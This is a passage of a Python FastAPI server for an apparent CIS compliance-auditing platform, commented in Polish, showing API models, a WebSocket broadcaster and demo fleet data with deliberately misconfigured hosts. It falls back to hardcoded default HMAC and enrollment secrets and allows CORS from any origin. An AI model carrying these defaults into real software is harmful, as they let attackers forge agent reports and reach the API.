"""
SystemAuditor Enterprise — Serwer Centralny (FastAPI + Rule Engine + PKI + Anti-Poisoning)
==========================================================================================
Główne funkcjonalności:
1. REST API v1 dla Agentów Endpoint:
   - POST /api/v1/register         (Rejestracja CSR PKCS#10 + wystawienie certyfikatu X.509 mTLS)
   - POST /api/v1/heartbeat        (Telemetria życia, CPU/RAM, synchronizacja wersji polityki)
   - GET  /api/v1/policies/current (Pobranie katalogu reguł CIS podpisanego kluczem Ed25519)
   - POST /api/v1/audit            (Odbiór surowych pomiarów, weryfikacja HMAC + Anti-Replay,
                                    detekcja Database Poisoning, ewaluacja CIS Rule Engine)
   - POST /api/v1/cert/renew       (Automatyczna rotacja krótkotrwałych certyfikatów X.509)
2. Kanał WebSocket:
   - WSS/WS /api/v1/ws/stream      (Powiadomienia w czasie rzeczywistym dla GUI oraz Agentów)
3. Symulator Floty Korporacyjnej oraz Symulator Ataków (Red-Team Poisoning / Replay / Spoofing)
   dostępny bezpośrednio z poziomu Dashboardu.
"""

import asyncio
import datetime
import hashlib
import hmac
import json
import logging
import os
import uuid
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, Header, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from pydantic import BaseModel, Field

from backend.auth_manager import JWTManager, PasswordHasher, TOTPManager
from backend.database import AuditDatabase
from backend.pki_manager import ZeroTrustPKIManager
from backend.rule_engine import AntiPoisoningDetector, CISRuleEngine

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("SystemAuditorServer")

BASE_DIR = Path(__file__).resolve().parent.parent
DATA_DIR = BASE_DIR / "data"
CERTS_DIR = DATA_DIR / "certs"
DB_PATH = DATA_DIR / "system_auditor.db"
CATALOG_PATH = BASE_DIR / "rules_catalog.yaml"
FRONTEND_PATH = BASE_DIR / "frontend" / "index.html"

HMAC_SHARED_SECRET = os.environ.get("AUDITOR_HMAC_SECRET", "super-secret-agent-signing-key")
BOOTSTRAP_ENROLLMENT_TOKEN = os.environ.get(
    "AUDITOR_ENROLLMENT_TOKEN", "enr-token-2026-enterprise-bootstrap"
)

# Inicjalizacja komponentów rdzeniowych
pki_manager = ZeroTrustPKIManager(CERTS_DIR)
rule_engine = CISRuleEngine(CATALOG_PATH)
db = AuditDatabase(DB_PATH)


# =====================================================================
# MODELE PYDANTIC V2 (RYGORYSTYCZNA WALIDACJA WEJŚCIA)
# =====================================================================

class LoginRequest(BaseModel):
    username: str = Field(..., min_length=2, max_length=64)
    password: str = Field(..., min_length=4, max_length=128)


class MFAVerifyRequest(BaseModel):
    mfa_challenge_token: str = Field(..., min_length=16, max_length=2048)
    totp_code: str = Field(..., min_length=6, max_length=6)


class CreateUserRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=64, pattern="^[a-zA-Z0-9_.-]+$")
    full_name: str = Field(..., min_length=2, max_length=128)
    password: str = Field(..., min_length=8, max_length=128)
    role: str = Field(default="SOC_ANALYST", pattern="^(SUPER_ADMIN|SOC_ANALYST|AUDITOR_READONLY)$")
    mfa_enabled: bool = True


class FirstLoginHardeningRequest(BaseModel):
    mode: str = Field(..., pattern="^(replace_builtin|change_password)$")
    new_username: Optional[str] = Field(default=None, max_length=64)
    new_full_name: Optional[str] = Field(default=None, max_length=128)
    new_password: str = Field(..., min_length=8, max_length=128)
    rotate_mfa_secret: bool = True


class AgentRegisterRequest(BaseModel):
    enrollment_token: str = Field(..., min_length=8, max_length=128)
    csr_pem: str = Field(..., min_length=100, max_length=8192)
    agent_id: Optional[str] = Field(None, max_length=64)
    hostname: str = Field(..., min_length=1, max_length=255)
    os_family: str = Field(..., pattern="^(Windows|Linux|windows|linux)$")
    os_release: str = Field(..., max_length=128)
    architecture: str = Field(default="AMD64", max_length=64)


class HeartbeatRequest(BaseModel):
    agent_id: str = Field(..., min_length=3, max_length=64)
    uptime_sec: int = Field(default=3600, ge=0)
    agent_version: str = Field(default="2.0.0-enterprise", max_length=32)
    current_policy_version: str = Field(..., max_length=64)
    cpu_usage_pct: float = Field(default=1.2, ge=0.0, le=100.0)
    mem_rss_mb: float = Field(default=28.5, ge=0.0, le=65536.0)


class MeasurementItem(BaseModel):
    check_id: str = Field(..., min_length=3, max_length=64)
    category: str = Field(..., max_length=128)
    title: str = Field(..., max_length=256)
    collector_type: str = Field(..., max_length=64)
    target: str = Field(..., max_length=512)
    raw_value: Any = None
    collected_at: str = Field(..., max_length=64)
    status: str = Field(default="COLLECTED", pattern="^(COLLECTED|ERROR|NOT_APPLICABLE)$")
    error_message: Optional[str] = Field(default=None, max_length=512)


class AuditReportSubmission(BaseModel):
    schema_version: str = Field(default="1.0", max_length=16)
    report_id: str = Field(..., min_length=8, max_length=64)
    agent_id: str = Field(..., min_length=3, max_length=64)
    hostname: str = Field(..., min_length=1, max_length=255)
    os_family: str = Field(..., max_length=32)
    os_release: str = Field(..., max_length=128)
    architecture: str = Field(..., max_length=64)
    is_elevated: bool = True
    timestamp_utc: str = Field(..., max_length=64)
    policy_version: str = Field(..., max_length=64)
    boot_id: Optional[str] = Field(default=None, max_length=128)
    measurements: List[MeasurementItem] = Field(..., min_length=1, max_length=200)


class CertRenewRequest(BaseModel):
    agent_id: str = Field(..., min_length=3, max_length=64)
    new_csr_pem: str = Field(..., min_length=100, max_length=8192)


class AttackSimulationRequest(BaseModel):
    scenario: str = Field(
        ...,
        pattern="^(spoofing|all_green_lie|replay_attack|sql_xss_injection)$",
    )
    target_agent_id: Optional[str] = None


# =====================================================================
# MENEDŻER POŁĄCZEŃ WEBSOCKET (REAL-TIME EVENT STREAM)
# =====================================================================

class ConnectionManager:
    def __init__(self) -> None:
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket) -> None:
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket) -> None:
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, event_type: str, data: Dict[str, Any]) -> None:
        message = json.dumps(
            {
                "event": event_type,
                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                "data": data,
            },
            ensure_ascii=False,
        )
        stale: List[WebSocket] = []
        for conn in self.active_connections:
            try:
                await conn.send_text(message)
            except Exception:
                stale.append(conn)
        for s in stale:
            self.disconnect(s)


ws_manager = ConnectionManager()


# =====================================================================
# APLIKACJA FASTAPI & MIDDLEWARE BEZPIECZEŃSTWA
# =====================================================================

app = FastAPI(
    title="SystemAuditor Enterprise — Zero-Trust OS Security Compliance Platform",
    version="2.0.0",
    description="Centralny serwer audytu konfiguracji OS (Windows & Linux) zgodny z CIS Benchmarks.",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.middleware("http")
async def security_headers_middleware(request: Request, call_next: Any) -> Any:
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response


# =====================================================================
# SEEDING DANYCH DEMONSTRACYJNYCH (FLOTA ENTERPRISE + PRAWDZIWY HOST)
# =====================================================================

def seed_enterprise_fleet_if_empty(include_demo: bool = False) -> None:
    """
    Domyślnie wykonuje rzeczywisty audyt WYŁĄCZNIE na bieżącej maszynie (Live OS).
    Dodatkowe węzły symulacyjne (Ubuntu/Debian/Windows Server) są ładowane tylko na jawne życzenie.
    """
    import socket as _sock

    if db.list_agents() and not include_demo:
        return

    now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
    policy_ver = rule_engine.metadata.get("version", "2026.10.2")
    local_agent_id = f"agt-{_sock.gethostname().lower()}"

    # 1. Uruchomienie prawdziwego kolektora na lokalnym hoście Windows/Linux
    try:
        from agent_poc import build_audit_report

        local_report = build_audit_report(
            agent_id=local_agent_id,
            policy_version=policy_ver,
        )
        local_dict = asdict(local_report)
        eval_res, score, counts = rule_engine.evaluate_measurements(
            local_report.os_family, local_dict["measurements"]
        )
        db.store_audit_report(
            report_id=local_report.report_id,
            agent_id=local_report.agent_id,
            hostname=local_report.hostname,
            os_family=local_report.os_family,
            os_release=local_report.os_release,
            architecture=local_report.architecture,
            ip_address="127.0.0.1",
            is_elevated=local_report.is_elevated,
            policy_version=policy_ver,
            submitted_at_utc=local_report.timestamp_utc,
            posture_score=score,
            counts=counts,
            is_quarantined=False,
            anomaly_risk_score=0,
            anomaly_findings=[],
            evaluated_results=[asdict(r) for r in eval_res],
            raw_payload=local_dict,
            boot_id=local_report.boot_id,
        )
    except Exception as exc:
        logger.warning("Nie udało się wykonać wstępnego audytu lokalnego: %s", exc)

    if not include_demo:
        return

    # 2. Dodatkowe węzły floty korporacyjnej (Linux Debian/Ubuntu + Windows Server)
    simulated_nodes = [
        {
            "agent_id": "agt-prod-ubuntu-db01",
            "hostname": "prod-pg-cluster-01.corp.internal",
            "os_family": "Linux",
            "os_release": "Ubuntu 24.04.1 LTS (6.8.0-45-generic)",
            "architecture": "x86_64",
            "ip_address": "10.24.10.15",
            "boot_id": "b11a-9920-linux-db01",
            "measurements": [
                {
                    "check_id": "LNX-CIS-5.2.8",
                    "category": "SSH Hardening",
                    "title": "Ensure SSH root login is disabled",
                    "collector_type": "linux_sshd_effective_config",
                    "target": "/etc/ssh/sshd_config",
                    "raw_value": {"directive": "PermitRootLogin", "value": "no"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.1.1",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure IPv4 packet forwarding is disabled",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.ip_forward",
                    "raw_value": {"value": 0},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.3.5",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure ICMP redirects are not accepted",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.conf.*.accept_redirects",
                    "raw_value": {
                        "values": {
                            "net.ipv4.conf.all.accept_redirects": 0,
                            "net.ipv4.conf.default.accept_redirects": 0,
                        }
                    },
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-6.1.10",
                    "category": "Filesystem Integrity & Permissions",
                    "title": "Ensure permissions on /etc/shadow are configured",
                    "collector_type": "linux_file_stat",
                    "target": "/etc/shadow",
                    "raw_value": {"uid": 0, "owner": "root", "group": "shadow", "mode_octal": "0640"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.5.1",
                    "category": "Kernel Memory Protection",
                    "title": "Ensure ASLR is fully enabled",
                    "collector_type": "linux_proc_sysctl",
                    "target": "kernel.randomize_va_space",
                    "raw_value": {"value": 2},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-4.1.1.1",
                    "category": "Audit & Logging",
                    "title": "Ensure auditd service is enabled and active",
                    "collector_type": "linux_systemd_service",
                    "target": "auditd.service",
                    "raw_value": {"value": "active"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-6.2.5",
                    "category": "Privilege Escalation",
                    "title": "Ensure root is the only UID 0 account in /etc/passwd",
                    "collector_type": "linux_passwd_uid0",
                    "target": "/etc/passwd",
                    "raw_value": {"value": 0, "non_root_uid0_accounts": []},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.3.3",
                    "category": "Privilege Escalation",
                    "title": "Ensure sudoers configuration does not allow NOPASSWD",
                    "collector_type": "linux_sudoers_nopasswd",
                    "target": "/etc/sudoers",
                    "raw_value": {"value": 0, "matches": []},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.4.1",
                    "category": "Hardware & Boot Integrity",
                    "title": "Ensure bootloader configuration (/boot/grub/grub.cfg) permissions are 0400/0600 root:root",
                    "collector_type": "linux_file_stat",
                    "target": "/boot/grub/grub.cfg",
                    "raw_value": {"uid": 0, "owner": "root", "group": "root", "mode_octal": "0600"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-NET-SURFACE-01",
                    "category": "Network Attack Surface",
                    "title": "Ensure no high-risk cleartext TCP ports are listening",
                    "collector_type": "network_listening_ports",
                    "target": "/proc/net/tcp",
                    "raw_value": {"value": 0, "exposed_ports": []},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.6.1",
                    "category": "Mandatory Access Control",
                    "title": "Ensure AppArmor or SELinux is installed, enabled, and in enforcing mode",
                    "collector_type": "linux_mac_status",
                    "target": "/sys/kernel/security/apparmor",
                    "raw_value": {"value": "enforcing"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.3.1",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure source routed packets are not accepted",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.conf.*.accept_source_route",
                    "raw_value": {"values": {"net.ipv4.conf.all.accept_source_route": 0, "net.ipv4.conf.default.accept_source_route": 0}},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.3.2",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure TCP SYN Cookies are enabled",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.tcp_syncookies",
                    "raw_value": {"value": 1},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.4.1.1",
                    "category": "Password & Account Policies",
                    "title": "Ensure password hashing algorithm is SHA-512 or YESCRYPT",
                    "collector_type": "linux_login_defs",
                    "target": "/etc/login.defs::ENCRYPT_METHOD",
                    "raw_value": {"value": "YESCRYPT"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.2.10",
                    "category": "SSH Hardening",
                    "title": "Ensure SSH password authentication is disabled",
                    "collector_type": "linux_sshd_effective_config",
                    "target": "/etc/ssh/sshd_config::PasswordAuthentication",
                    "raw_value": {"value": "no"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.7.1",
                    "category": "Kernel Memory Protection",
                    "title": "Ensure core dumps of SUID programs are restricted",
                    "collector_type": "linux_proc_sysctl",
                    "target": "fs.suid_dumpable",
                    "raw_value": {"value": 0},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.1.1",
                    "category": "Filesystem Integrity & Permissions",
                    "title": "Ensure permissions on /etc/crontab are configured",
                    "collector_type": "linux_file_stat",
                    "target": "/etc/crontab",
                    "raw_value": {"uid": 0, "owner": "root", "group": "root", "mode_octal": "0600"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.2.2",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure ICMP broadcast echo requests are ignored",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.icmp_echo_ignore_broadcasts",
                    "raw_value": {"value": 1},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.2.4",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure suspicious packets (Martians) are logged",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.conf.*.log_martians",
                    "raw_value": {"values": {"net.ipv4.conf.all.log_martians": 1, "net.ipv4.conf.default.log_martians": 1}},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.4.4",
                    "category": "Filesystem Integrity & Permissions",
                    "title": "Ensure default user umask is 027 or more restrictive",
                    "collector_type": "linux_login_defs",
                    "target": "/etc/login.defs::UMASK",
                    "raw_value": {"value": "027"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
            ],
        },
        {
            "agent_id": "agt-dmz-debian-gw02",
            "hostname": "dmz-bastion-gw02.corp.internal",
            "os_family": "Linux",
            "os_release": "Debian GNU/Linux 12 (bookworm)",
            "architecture": "x86_64",
            "ip_address": "172.16.100.8",
            "boot_id": "b22c-4410-debian-gw02",
            "measurements": [
                {
                    "check_id": "LNX-CIS-5.2.8",
                    "category": "SSH Hardening",
                    "title": "Ensure SSH root login is disabled",
                    "collector_type": "linux_sshd_effective_config",
                    "target": "/etc/ssh/sshd_config",
                    "raw_value": {"directive": "PermitRootLogin", "value": "yes"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.1.1",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure IPv4 packet forwarding is disabled",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.ip_forward",
                    "raw_value": {"value": 1},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.3.5",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure ICMP redirects are not accepted",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.conf.*.accept_redirects",
                    "raw_value": {
                        "values": {
                            "net.ipv4.conf.all.accept_redirects": 1,
                            "net.ipv4.conf.default.accept_redirects": 1,
                        }
                    },
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-6.1.10",
                    "category": "Filesystem Integrity & Permissions",
                    "title": "Ensure permissions on /etc/shadow are configured",
                    "collector_type": "linux_file_stat",
                    "target": "/etc/shadow",
                    "raw_value": {"uid": 0, "owner": "root", "group": "root", "mode_octal": "0644"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.5.1",
                    "category": "Kernel Memory Protection",
                    "title": "Ensure ASLR is fully enabled",
                    "collector_type": "linux_proc_sysctl",
                    "target": "kernel.randomize_va_space",
                    "raw_value": {"value": 2},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-4.1.1.1",
                    "category": "Audit & Logging",
                    "title": "Ensure auditd service is enabled and active",
                    "collector_type": "linux_systemd_service",
                    "target": "auditd.service",
                    "raw_value": {"value": "inactive"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-6.2.5",
                    "category": "Privilege Escalation",
                    "title": "Ensure root is the only UID 0 account in /etc/passwd",
                    "collector_type": "linux_passwd_uid0",
                    "target": "/etc/passwd",
                    "raw_value": {"value": 1, "non_root_uid0_accounts": ["svc_backup_root"]},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.3.3",
                    "category": "Privilege Escalation",
                    "title": "Ensure sudoers configuration does not allow NOPASSWD",
                    "collector_type": "linux_sudoers_nopasswd",
                    "target": "/etc/sudoers",
                    "raw_value": {"value": 1, "matches": ["90-cloud-init: deploy ALL=(ALL) NOPASSWD:ALL"]},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.4.1",
                    "category": "Hardware & Boot Integrity",
                    "title": "Ensure bootloader configuration (/boot/grub/grub.cfg) permissions are 0400/0600 root:root",
                    "collector_type": "linux_file_stat",
                    "target": "/boot/grub/grub.cfg",
                    "raw_value": {"uid": 0, "owner": "root", "group": "root", "mode_octal": "0644"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-NET-SURFACE-01",
                    "category": "Network Attack Surface",
                    "title": "Ensure no high-risk cleartext TCP ports are listening",
                    "collector_type": "network_listening_ports",
                    "target": "/proc/net/tcp",
                    "raw_value": {"value": 2, "exposed_ports": [21, 23]},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.6.1",
                    "category": "Mandatory Access Control",
                    "title": "Ensure AppArmor or SELinux is installed, enabled, and in enforcing mode",
                    "collector_type": "linux_mac_status",
                    "target": "/sys/kernel/security/apparmor",
                    "raw_value": {"value": "disabled"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.3.1",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure source routed packets are not accepted",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.conf.*.accept_source_route",
                    "raw_value": {"values": {"net.ipv4.conf.all.accept_source_route": 1, "net.ipv4.conf.default.accept_source_route": 1}},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.3.2",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure TCP SYN Cookies are enabled",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.tcp_syncookies",
                    "raw_value": {"value": 0},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.4.1.1",
                    "category": "Password & Account Policies",
                    "title": "Ensure password hashing algorithm is SHA-512 or YESCRYPT",
                    "collector_type": "linux_login_defs",
                    "target": "/etc/login.defs::ENCRYPT_METHOD",
                    "raw_value": {"value": "MD5"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.2.10",
                    "category": "SSH Hardening",
                    "title": "Ensure SSH password authentication is disabled",
                    "collector_type": "linux_sshd_effective_config",
                    "target": "/etc/ssh/sshd_config::PasswordAuthentication",
                    "raw_value": {"value": "yes"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-1.7.1",
                    "category": "Kernel Memory Protection",
                    "title": "Ensure core dumps of SUID programs are restricted",
                    "collector_type": "linux_proc_sysctl",
                    "target": "fs.suid_dumpable",
                    "raw_value": {"value": 1},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.1.1",
                    "category": "Filesystem Integrity & Permissions",
                    "title": "Ensure permissions on /etc/crontab are configured",
                    "collector_type": "linux_file_stat",
                    "target": "/etc/crontab",
                    "raw_value": {"uid": 0, "owner": "root", "group": "root", "mode_octal": "0644"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.2.2",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure ICMP broadcast echo requests are ignored",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.icmp_echo_ignore_broadcasts",
                    "raw_value": {"value": 0},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-3.2.4",
                    "category": "Kernel Network Hardening",
                    "title": "Ensure suspicious packets (Martians) are logged",
                    "collector_type": "linux_proc_sysctl",
                    "target": "net.ipv4.conf.*.log_martians",
                    "raw_value": {"values": {"net.ipv4.conf.all.log_martians": 0, "net.ipv4.conf.default.log_martians": 0}},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "LNX-CIS-5.4.4",
                    "category": "Filesystem Integrity & Permissions",
                    "title": "Ensure default user umask is 027 or more restrictive",
                    "collector_type": "linux_login_defs",
                    "target": "/etc/login.defs::UMASK",
                    "raw_value": {"value": "022"},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
            ],
        },
        {
            "agent_id": "agt-win-dc01-ad",
            "hostname": "WIN-DC01-CORP.corp.internal",
            "os_family": "Windows",
            "os_release": "Windows Server 2022 Datacenter (21H2)",
            "architecture": "AMD64",
            "ip_address": "10.24.1.10",
            "boot_id": "boot-win-dc01-9981",
            "measurements": [
                {
                    "check_id": "WIN-CIS-18.3.1",
                    "category": "Network Security",
                    "title": "Ensure SMBv1 Server protocol is disabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\SMB1",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.17.1",
                    "category": "Privilege Escalation",
                    "title": "Ensure UAC Admin Approval Mode is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-1.1.1",
                    "category": "Password & Account Policies",
                    "title": "Ensure 'Minimum password length' is set to 14 or more characters",
                    "collector_type": "windows_security_policy",
                    "target": "SecPol\\System Access\\MinimumPasswordLength",
                    "raw_value": {"value": 16},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-9.1.1",
                    "category": "Host Firewall & Endpoint Protection",
                    "title": "Ensure Windows Defender Firewall is On",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.4.2",
                    "category": "Credential Protection",
                    "title": "Ensure WDigest Authentication is disabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.11.7",
                    "category": "Credential Protection",
                    "title": "Ensure LAN Manager authentication level is set to NTLMv2 only (5)",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel",
                    "raw_value": {"value": 5, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.47.1",
                    "category": "Credential Protection",
                    "title": "Ensure LSASS runs as Protected Process Light (RunAsPPL)",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.10.57.1",
                    "category": "Audit & Logging",
                    "title": "Ensure PowerShell Script Block Logging is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.1.2",
                    "category": "Password & Account Policies",
                    "title": "Ensure 'Accounts: Guest account status' is set to 'Disabled'",
                    "collector_type": "windows_sam_account",
                    "target": "Win32API::NetUserGetInfo(Guest)",
                    "raw_value": {"value": 0, "is_disabled": True},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.102.2",
                    "category": "Remote Access & RDP Hardening",
                    "title": "Ensure RDP Network Level Authentication (NLA) is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\UserAuthentication",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.10.1",
                    "category": "Hardware & Boot Integrity",
                    "title": "Ensure UEFI Secure Boot is enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State\\UEFISecureBootEnabled",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-NET-SURFACE-01",
                    "category": "Network Attack Surface",
                    "title": "Ensure no high-risk cleartext TCP ports are listening",
                    "collector_type": "network_listening_ports",
                    "target": "TCP::[21,23,69,513,514]",
                    "raw_value": {"value": 0, "exposed_ports": []},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.30.2",
                    "category": "Network Protocol Hardening",
                    "title": "Ensure 'Turn off multicast name resolution' (LLMNR) is set to 'Enabled'",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\EnableMulticast",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.7.4",
                    "category": "Network Security",
                    "title": "Ensure 'Microsoft network client: Digitally sign communications (always)' is set to 'Enabled'",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters\\RequireSecuritySignature",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.5.1",
                    "category": "Endpoint Protection & Antivirus",
                    "title": "Ensure 'Windows Defender Antivirus: Real-time Protection' is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
